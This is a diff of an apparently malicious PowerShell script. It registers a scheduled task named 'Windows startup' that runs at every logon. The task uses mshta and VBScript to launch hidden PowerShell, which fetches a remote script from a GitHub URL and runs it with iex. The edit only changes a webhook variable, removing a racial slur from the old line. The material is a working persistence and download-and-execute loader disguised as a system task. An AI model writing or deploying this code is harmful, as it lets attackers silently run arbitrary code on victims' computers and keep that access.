@@ -1,7 +1,7 @@
 $task_name = "Windows startup"
 
 # Định nghĩa hành động cho tác vụ
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='nigga';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='a';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 
 # Định nghĩa trigger cho tác vụ
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
